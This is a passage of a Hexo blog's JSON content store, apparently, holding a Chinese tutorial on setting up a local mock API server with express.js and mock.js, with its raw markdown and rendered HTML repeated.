class=\"line\"><span class=\"comment\">// `String.lastIndexOf()` 方法返回指定值（本例中的`.`）在调用该方法的字符串中最后出现的位置，如果没找到则返回 -1。</span></span><br><span class=\"line\"><span class=\"comment\">// 对于`filename`和`.hiddenfile`，`lastIndexOf` 的返回值分别为0和-1无符号右移操作符(»&gt;) 将-1转换为4294967295，将-2转换为4294967294，</span></span><br><span class=\"line\"><span class=\"comment\">// 这个方法可以保证边缘情况时文件名不变。</span></span><br><span class=\"line\"><span class=\"comment\">// `String.prototype.slice()` 从上面计算的索引处提取文件的扩展名。如果索引比文件名的长度大，结果为\"\"。</span></span><br></pre></td></tr></table></figure></p>\n"},{"id":"0809032","title":"使用express.js和mock.js搭建<mock-server>","date":"2018-03-10T05:21:12.000Z","_content":"\n#### <a>1、安装</a>\n\n- `express.js` 是基于 `Node.js` 环境的服务端框架，所以使用前请确保本地安装有Node.js；\n\n> 安装：\n\n1. 安装 `Express` 应用生成器(快速创建一个应用的骨架)：\n  ```sh\n  # 安装 `express` 应用生成器\n  $ npm install express-generator -g\n\n  # 查看可用命令\n  $ express -h\n  ```\n\n2. 下面的示例就是在当前工作目录下创建一个命名为 `mock-server` 的应用:\n  ```sh\n  $ express mock-server\n\n  warning: the default view engine will not be jade in future releases\n  warning: use `--view=jade' or `--help' for additional options\n\n\n    create : mock-server\n    create : mock-server/package.json\n    create : mock-server/app.js\n    create : mock-server/routes\n    create : mock-server/routes/index.js\n    create : mock-server/routes/users.js\n    create : mock-server/views\n    create : mock-server/views/index.jade\n    create : mock-server/views/layout.jade\n    create : mock-server/views/error.jade\n    create : mock-server/public\n    create : mock-server/bin\n    create : mock-server/bin/www\n    create : mock-server/public/javascripts\n    create : mock-server/public/images\n    create : mock-server/public/stylesheets\n    create : mock-server/public/stylesheets/style.css\n\n    install dependencies:\n      $ cd mock-server && npm install\n\n    run the app:\n      $ DEBUG=mock-server:* npm start\n\n  ```\n\n3. 完善 `express` 应用：\n  ```sh\n  # 进入 `mock-server` 目录并安装应用依赖\n  $ cd mock-server && npm install\n\n  # 启动该应用\n  $ DEBUG=mock-server:* npm start\n  ```\n\n#### <a>2、使用</a>\n\n1. 到目前为止我们还只是安装了 `express.js`，还没有安装 `mock.js`，所以先安装mockjs：\n  ```sh\n  # 安装 mock.js\n  $ npm install mockjs --save-dev\n  ```\n\n2. 使用 `mock.js`，创建路由接口，在 `routes/` 目录下创建一个 `mock.js` 文件：\n  ```js\n  var express = require('express');\n  var router = express.Router();\n\n  // 引入 mock.js\n  var Mock = require('mockjs');\n\n  /* GET mock-api listing. */\n  router.get('/', function(req, res, next) {\n    var obj = {'aa':'11', 'bb':'22', 'cc':'33', 'dd':'44'};\n    // Mock响应模板\n    var data = Mock.mock({\n      \"user|1-3\": [{                            // 随机生成1到3个数组元素\n        'name': '@cname',                       // 中文名称\n        'id|+1': 88,                            // 属性值自动加 1，初始值为88\n        'age|18-28': 0,                         // 18至28以内随机整数, 0只是用来确定类型\n        'birthday': '@date(\"yyyy-MM-dd\")',      // 日期\n        'city': '@city(true)',                  // 中国城市\n        'color': '@color',                      // 16进制颜色\n        'isMale|1': true,                       // 布尔值\n        'isFat|1-2': true,                      // true的概率是1/3\n        'fromObj|2': obj,                       // 从obj对象中随机获取2个属性\n        'fromObj2|1-3': obj,                    // 从obj对象中随机获取1至3个属性\n        'brother|1': ['jack', 'jim'],           // 随机选取 1 个元素\n        'sister|+1': ['jack', 'jim', 'lily'],   // array中顺序选取元素作为结果\n        'friends|2': ['jack', 'jim']            // 重复2次属性值生成一个新数组\n      },{\n        'gf': '@cname'\n      }]\n    });\n\n    res.send(data);\n  });\n\n  module.exports = router;\n  ```\n\n3. 挂载路由接口，在根目录的 `app.js` 文件中添加：\n  ```js\n  ...\n\n  // mock.js\n  var mockApi = require('./routes/mock');\n\n  ...\n\n  // mockjs\n  app.use('/api', mockApi);\n  ...\n  ```\n\n4. 小功告成，这时再启动服务：\n  ```sh\n  $ DEBUG=mock-server:* npm start\n\n  > mock-server@0.0.0 start D:\\START\\files\\mock-server\n  > node ./bin/www\n\n  Tue, 03 Apr 2018 03:25:17 GMT mock-server:server Listening on port 3000\n\n  # 访问 localhost:3000/api 就会得到相应的接口数据\n\n  ```\n\n5. 更多 `mock.js` 配置请 [查看更多](https://github.com/nuysoft/Mock/wiki)","source":"_posts/0809032_使用express-js和mock-js搭建-mock-server.md","raw":"---\nid: 0809032\ntitle: 使用express.js和mock.js搭建<mock-server>\ndate: 2018-03-10 13:21:12\ntags:   \n  - expressjs\n  - mockjs\ncategories:\n---\n\n#### <a>1、安装</a>\n\n- `express.js` 是基于 `Node.js` 环境的服务端框架，所以使用前请确保本地安装有Node.js；\n\n> 安装：\n\n1. 安装 `Express` 应用生成器(快速创建一个应用的骨架)：\n  ```sh\n  # 安装 `express` 应用生成器\n  $ npm install express-generator -g\n\n  # 查看可用命令\n  $ express -h\n  ```\n\n2. 下面的示例就是在当前工作目录下创建一个命名为 `mock-server` 的应用:\n  ```sh\n  $ express mock-server\n\n  warning: the default view engine will not be jade in future releases\n  warning: use `--view=jade' or `--help' for additional options\n\n\n    create : mock-server\n    create : mock-server/package.json\n    create : mock-server/app.js\n    create : mock-server/routes\n    create : mock-server/routes/index.js\n    create : mock-server/routes/users.js\n    create : mock-server/views\n    create : mock-server/views/index.jade\n    create : mock-server/views/layout.jade\n    create : mock-server/views/error.jade\n    create : mock-server/public\n    create : mock-server/bin\n    create : mock-server/bin/www\n    create : mock-server/public/javascripts\n    create : mock-server/public/images\n    create : mock-server/public/stylesheets\n    create : mock-server/public/stylesheets/style.css\n\n    install dependencies:\n      $ cd mock-server && npm install\n\n    run the app:\n      $ DEBUG=mock-server:* npm start\n\n  ```\n\n3. 完善 `express` 应用：\n  ```sh\n  # 进入 `mock-server` 目录并安装应用依赖\n  $ cd mock-server && npm install\n\n  # 启动该应用\n  $ DEBUG=mock-server:* npm start\n  ```\n\n#### <a>2、使用</a>\n\n1. 到目前为止我们还只是安装了 `express.js`，还没有安装 `mock.js`，所以先安装mockjs：\n  ```sh\n  # 安装 mock.js\n  $ npm install mockjs --save-dev\n  ```\n\n2. 使用 `mock.js`，创建路由接口，在 `routes/` 目录下创建一个 `mock.js` 文件：\n  ```js\n  var express = require('express');\n  var router = express.Router();\n\n  // 引入 mock.js\n  var Mock = require('mockjs');\n\n  /* GET mock-api listing. */\n  router.get('/', function(req, res, next) {\n    var obj = {'aa':'11', 'bb':'22', 'cc':'33', 'dd':'44'};\n    // Mock响应模板\n    var data = Mock.mock({\n      \"user|1-3\": [{                            // 随机生成1到3个数组元素\n        'name': '@cname',                       // 中文名称\n        'id|+1': 88,                            // 属性值自动加 1，初始值为88\n        'age|18-28': 0,                         // 18至28以内随机整数, 0只是用来确定类型\n        'birthday': '@date(\"yyyy-MM-dd\")',      // 日期\n        'city': '@city(true)',                  // 中国城市\n        'color': '@color',                      // 16进制颜色\n        'isMale|1': true,                       // 布尔值\n        'isFat|1-2': true,                      // true的概率是1/3\n        'fromObj|2': obj,                       // 从obj对象中随机获取2个属性\n        'fromObj2|1-3': obj,                    // 从obj对象中随机获取1至3个属性\n        'brother|1': ['jack', 'jim'],           // 随机选取 1 个元素\n        'sister|+1': ['jack', 'jim', 'lily'],   // array中顺序选取元素作为结果\n        'friends|2': ['jack', 'jim']            // 重复2次属性值生成一个新数组\n      },{\n        'gf': '@cname'\n      }]\n    });\n\n    res.send(data);\n  });\n\n  module.exports = router;\n  ```\n\n3. 挂载路由接口，在根目录的 `app.js` 文件中添加：\n  ```js\n  ...\n\n  // mock.js\n  var mockApi = require('./routes/mock');\n\n  ...\n\n  // mockjs\n  app.use('/api', mockApi);\n  ...\n  ```\n\n4. 小功告成，这时再启动服务：\n  ```sh\n  $ DEBUG=mock-server:* npm start\n\n  > mock-server@0.0.0 start D:\\START\\files\\mock-server\n  > node ./bin/www\n\n  Tue, 03 Apr 2018 03:25:17 GMT mock-server:server Listening on port 3000\n\n  # 访问 localhost:3000/api 就会得到相应的接口数据\n\n  ```\n\n5. 更多 `mock.js` 配置请 [查看更多](https://github.com/nuysoft/Mock/wiki)","slug":"0809032_使用express-js和mock-js搭建-mock-server","published":1,"updated":"2018-04-03T03:28:12.774Z","_id":"cjfhshvw5002ms4c0oc9yjs90","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"1、安装\"><a href=\"#1、安装\" class=\"headerlink\" title=\"1、安装\"></a><a>1、安装</a></h4><ul>\n<li><code>express.js</code> 是基于 <code>Node.js</code> 环境的服务端框架，所以使用前请确保本地安装有Node.js；</li>\n</ul>\n<blockquote>\n<p>安装：</p>\n</blockquote>\n<ol>\n<li><p>安装 <code>Express</code> 应用生成器(快速创建一个应用的骨架)：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装 `express` 应用生成器</span></span><br><span class=\"line\">$ npm install express-generator -g</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查看可用命令</span></span><br><span class=\"line\">$ express -h</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>下面的示例就是在当前工作目录下创建一个命名为 <code>mock-server</code> 的应用:</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ express mock-server</span><br><span class=\"line\"></span><br><span class=\"line\">warning: the default view engine will not be jade <span class=\"keyword\">in</span> future releases</span><br><span class=\"line\">warning: use `--view=jade<span class=\"string\">' or `--help'</span> <span class=\"keyword\">for</span> additional options</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  create : mock-server</span><br><span class=\"line\">  create : mock-server/package.json</span><br><span class=\"line\">  create : mock-server/app.js</span><br><span class=\"line\">  create : mock-server/routes</span><br><span class=\"line\">  create : mock-server/routes/index.js</span><br><span class=\"line\">  create : mock-server/routes/users.js</span><br><span class=\"line\">  create : mock-server/views</span><br><span class=\"line\">  create : mock-server/views/index.jade</span><br><span class=\"line\">  create : mock-server/views/layout.jade</span><br><span class=\"line\">  create : mock-server/views/error.jade</span><br><span class=\"line\">  create : mock-server/public</span><br><span class=\"line\">  create : mock-server/bin</span><br><span class=\"line\">  create : mock-server/bin/www</span><br><span class=\"line\">  create : mock-server/public/javascripts</span><br><span class=\"line\">  create : mock-server/public/images</span><br><span class=\"line\">  create : mock-server/public/stylesheets</span><br><span class=\"line\">  create : mock-server/public/stylesheets/style.css</span><br><span class=\"line\"></span><br><span class=\"line\">  install dependencies:</span><br><span class=\"line\">    $ <span class=\"built_in\">cd</span> mock-server &amp;&amp; npm install</span><br><span class=\"line\"></span><br><span class=\"line\">  run the app:</span><br><span class=\"line\">    $ DEBUG=mock-server:* npm start</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>完善 <code>express</code> 应用：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 进入 `mock-server` 目录并安装应用依赖</span></span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> mock-server &amp;&amp; npm install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 启动该应用</span></span><br><span class=\"line\">$ DEBUG=mock-server:* npm start</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h4 id=\"2、使用\"><a href=\"#2、使用\" class=\"headerlink\" title=\"2、使用\"></a><a>2、使用</a></h4><ol>\n<li><p>到目前为止我们还只是安装了 <code>express.js</code>，还没有安装 <code>mock.js</code>，所以先安装mockjs：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装 mock.js</span></span><br><span class=\"line\">$ npm install mockjs --save-dev</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用 <code>mock.js</code>，创建路由接口，在 <code>routes/</code> 目录下创建一个 <code>mock.js</code> 文件：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> express = <span class=\"built_in\">require</span>(<span class=\"string\">'express'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> router = express.Router();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 引入 mock.js</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> Mock = <span class=\"built_in\">require</span>(<span class=\"string\">'mockjs'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* GET mock-api listing. */</span></span><br><span class=\"line\">router.get(<span class=\"string\">'/'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">req, res, next</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> obj = &#123;<span class=\"string\">'aa'</span>:<span class=\"string\">'11'</span>, <span class=\"string\">'bb'</span>:<span class=\"string\">'22'</span>, <span class=\"string\">'cc'</span>:<span class=\"string\">'33'</span>, <span class=\"string\">'dd'</span>:<span class=\"string\">'44'</span>&#125;;</span><br><span class=\"line\">  <span class=\"comment\">// Mock响应模板</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> data = Mock.mock(&#123;</span><br><span class=\"line\">    <span class=\"string\">\"user|1-3\"</span>: [&#123;                            <span class=\"comment\">// 随机生成1到3个数组元素</span></span><br><span class=\"line\">      <span class=\"string\">'name'</span>: <span class=\"string\">'@cname'</span>,                       <span class=\"comment\">// 中文名称</span></span><br><span class=\"line\">      <span class=\"string\">'id|+1'</span>: <span class=\"number\">88</span>,                            <span class=\"comment\">// 属性值自动加 1，初始值为88</span></span><br><span class=\"line\">      <span class=\"string\">'age|18-28'</span>: <span class=\"number\">0</span>,                         <span class=\"comment\">// 18至28以内随机整数, 0只是用来确定类型</span></span><br><span class=\"line\">      <span class=\"string\">'birthday'</span>: <span class=\"string\">'@date(\"yyyy-MM-dd\")'</span>,      <span class=\"comment\">// 日期</span></span><br><span class=\"line\">      <span class=\"string\">'city'</span>: <span class=\"string\">'@city(true)'</span>,                  <span class=\"comment\">// 中国城市</span></span><br><span class=\"line\">      <span class=\"string\">'color'</span>: <span class=\"string\">'@color'</span>,                      <span class=\"comment\">// 16进制颜色</span></span><br><span class=\"line\">      <span class=\"string\">'isMale|1'</span>: <span class=\"literal\">true</span>,                       <span class=\"comment\">// 布尔值</span></span><br><span class=\"line\">      <span class=\"string\">'isFat|1-2'</span>: <span class=\"literal\">true</span>,                      <span class=\"comment\">// true的概率是1/3</span></span><br><span class=\"line\">      <span class=\"string\">'fromObj|2'</span>: obj,                       <span class=\"comment\">// 从obj对象中随机获取2个属性</span></span><br><span class=\"line\">      <span class=\"string\">'fromObj2|1-3'</span>: obj,                    <span class=\"comment\">// 从obj对象中随机获取1至3个属性</span></span><br><span class=\"line\">      <span class=\"string\">'brother|1'</span>: [<span class=\"string\">'jack'</span>, <span class=\"string\">'jim'</span>],           <span class=\"comment\">// 随机选取 1 个元素</span></span><br><span class=\"line\">      <span class=\"string\">'sister|+1'</span>: [<span class=\"string\">'jack'</span>, <span class=\"string\">'jim'</span>, <span class=\"string\">'lily'</span>],   <span class=\"comment\">// array中顺序选取元素作为结果</span></span><br><span class=\"line\">      <span class=\"string\">'friends|2'</span>: [<span class=\"string\">'jack'</span>, <span class=\"string\">'jim'</span>]            <span class=\"comment\">// 重复2次属性值生成一个新数组</span></span><br><span class=\"line\">    &#125;,&#123;</span><br><span class=\"line\">      <span class=\"string\">'gf'</span>: <span class=\"string\">'@cname'</span></span><br><span class=\"line\">    &#125;]</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  res.send(data);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = router;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>挂载路由接口，在根目录的 <code>app.js</code> 文件中添加：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// mock.js</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> mockApi = <span class=\"built_in\">require</span>(<span class=\"string\">'./routes/mock'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// mockjs</span></span><br><span class=\"line\">app.use(<span class=\"string\">'/api'</span>, mockApi);</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>小功告成，这时再启动服务：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ DEBUG=mock-server:* npm start</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; mock-server@0.0.0 start D:\\START\\files\\mock-server</span><br><span class=\"line\">&gt; node ./bin/www</span><br><span class=\"line\"></span><br><span class=\"line\">Tue, 03 Apr 2018 03:25:17 GMT mock-server:server Listening on port 3000</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 访问 localhost:3000/api 就会得到相应的接口数据</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>更多 <code>mock.js</code> 配置请 <a href=\"https://github.com/nuysoft/Mock/wiki\" target=\"_blank\" rel=\"noopener\">查看更多</a></p>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1、安装\"><a href=\"#1、安装\" class=\"headerlink\" title=\"1、安装\"></a><a>1、安装</a></h4><ul>\n<li><code>express.js</code> 是基于 <code>Node.js</code> 环境的服务端框架，所以使用前请确保本地安装有Node.js；</li>\n</ul>\n<blockquote>\n<p>安装：</p>\n</blockquote>\n<ol>\n<li><p>安装 <code>Express</code> 应用生成器(快速创建一个应用的骨架)：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装 `express` 应用生成器</span></span><br><span class=\"line\">$ npm install express-generator -g</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查看可用命令</span></span><br><span class=\"line\">$ express -h</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>下面的示例就是在当前工作目录下创建一个命名为 <code>mock-server</code> 的应用:</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ express mock-server</span><br><span class=\"line\"></span><br><span class=\"line\">warning: the default view engine will not be jade <span class=\"keyword\">in</span> future releases</span><br><span class=\"line\">warning: use `--view=jade<span class=\"string\">' or `--help'</span> <span class=\"keyword\">for</span> additional options</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  create : mock-server</span><br><span class=\"line\">  create : mock-server/package.json</span><br><span class=\"line\">  create : mock-server/app.js</span><br><span class=\"line\">  create : mock-server/routes</span><br><span class=\"line\">  create : mock-server/routes/index.js</span><br><span class=\"line\">  create : mock-server/routes/users.js</span><br><span class=\"line\">  create : mock-server/views</span><br><span class=\"line\">  create : mock-server/views/index.jade</span><br><span class=\"line\">  create : mock-server/views/layout.jade</span><br><span class=\"line\">  create : mock-server/views/error.jade</span><br><span class=\"line\">  create : mock-server/public</span><br><span class=\"line\">  create : mock-server/bin</span><br><span class=\"line\">  create : mock-server/bin/www</span><br><span class=\"line\">  create : mock-server/public/javascripts</span><br><span class=\"line\">  create : mock-server/public/images</span><br><span class=\"line\">  create : mock-server/public/stylesheets</span><br><span class=\"line\">  create : mock-server/public/stylesheets/style.css</span><br><span class=\"line\"></span><br><span class=\"line\">  install dependencies:</span><br><span class=\"line\">    $ <span class=\"built_in\">cd</span> mock-server &amp;&amp; npm install</span><br><span class=\"line\"></span><br><span class=\"line\">  run the app:</span><br><span class=\"line\">    $ DEBUG=mock-server:* npm start</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>完善 <code>express</code> 应用：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 进入 `mock-server` 目录并安装应用依赖</span></span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> mock-server &amp;&amp; npm install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 启动该应用</span></span><br><span class=\"line\">$ DEBUG=mock-server:* npm start</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h4 id=\"2、使用\"><a href=\"#2、使用\" class=\"headerlink\" title=\"2、使用\"></a><a>2、使用</a></h4><ol>\n<li><p>到目前为止我们还只是安装了 <code>express.js</code>，还没有安装 <code>mock.js</code>，所以先安装mockjs：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装 mock.js</span></span><br><span class=\"line\">$ npm install mockjs --save-dev</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用 <code>mock.js</code>，创建路由接口，在 <code>routes/</code> 目录下创建一个 <code>mock.js</code> 文件：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> express = <span class=\"built_in\">require</span>(<span class=\"string\">'express'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> router = express.Router();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 引入 mock.js</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> Mock = <span class=\"built_in\">require</span>(<span class=\"string\">'mockjs'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* GET mock-api listing. */</span></span><br><span class=\"line\">router.get(<span class=\"string\">'/'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">req, res, next</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> obj = &#123;<span class=\"string\">'aa'</span>:<span class=\"string\">'11'</span>, <span class=\"string\">'bb'</span>:<span class=\"string\">'22'</span>, <span class=\"string\">'cc'</span>:<span class=\"string\">'33'</span>, <span class=\"string\">'dd'</span>:<span class=\"string\">'44'</span>&#125;;</span><br><span class=\"line\">  <span class=\"comment\">// Mock响应模板</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> data = Mock.mock(&#123;</span><br><span class=\"line\">    <span class=\"string\">\"user|1-3\"</span>: [&#123;                            <span class=\"comment\">// 随机生成1到3个数组元素</span></span><br><span class=\"line\">      <span class=\"string\">'name'</span>: <span class=\"string\">'@cname'</span>,                       <span class=\"comment\">// 中文名称</span></span><br><span class=\"line\">      <span class=\"string\">'id|+1'</span>: <span class=\"number\">88</span>,                            <span class=\"comment\">// 属性值自动加 1，初始值为88</span></span><br><span class=\"line\">      <span class=\"string\">'age|18-28'</span>: <span class=\"number\">0</span>,                         <span class=\"comment\">// 18至28以内随机整数, 0只是用来确定类型</span></span><br><span class=\"line\">      <span class=\"string\">'birthday'</span>: <span class=\"string\">'@date(\"yyyy-MM-dd\")'</span>,      <span class=\"comment\">// 日期</span></span><br><span class=\"line\">      <span class=\"string\">'city'</span>: <span class=\"string\">'@city(true)'</span>,                  <span class=\"comment\">// 中国城市</span></span><br><span class=\"line\">      <span class=\"string\">'color'</span>: <span class=\"string\">'@color'</span>,                      <span class=\"comment\">// 16进制颜色</span></span><br><span class=\"line\">      <span class=\"string\">'isMale|1'</span>: <span class=\"literal\">true</span>,                       <span class=\"comment\">// 布尔值</span></span><br><span class=\"line\">      <span class=\"string\">'isFat|1-2'</span>: <span class=\"literal\">true</span>,                      <span class=\"comment\">// true的概率是1/3</span></span><br><span class=\"line\">      <span class=\"string\">'fromObj|2'</span>: obj,                       <span class=\"comment\">// 从obj对象中随机获取2个属性</span></span><br><span class=\"line\">      <span class=\"string\">'fromObj2|1-3'</span>: obj,                    <span class=\"comment\">// 从obj对象中随机获取1至3个属性</span></span><br><span class=\"line\">      <span class=\"string\">'brother|1'</span>: [<span class=\"string\">'jack'</span>, <span class=\"string\">'jim'</span>],           <span class=\"comment\">// 随机选取 1 个元素</span></span><br><span class=\"line\">      <span class=\"string\">'sister|+1'</span>: [<span class=\"string\">'jack'</span>, <span class=\"string\">'jim'</span>, <span class=\"string\">'lily'</span>],   <span class=\"comment\">// array中顺序选取元素作为结果</span></span><br><span class=\"line\">      <span class=\"string\">'friends|2'</span>: [<span class=\"string\">'jack'</span>, <span class=\"string\">'jim'</span>]            <span class=\"comment\">// 重复2次属性值生成一个新数组</span></span><br><span class=\"line\">    &#125;,&#123;</span><br><span class=\"line\">      <span class=\"string\">'gf'</span>: <span class=\"string\">'@cname'</span></span><br><span class=\"line\">    &#125;]</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  res.send(data);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = 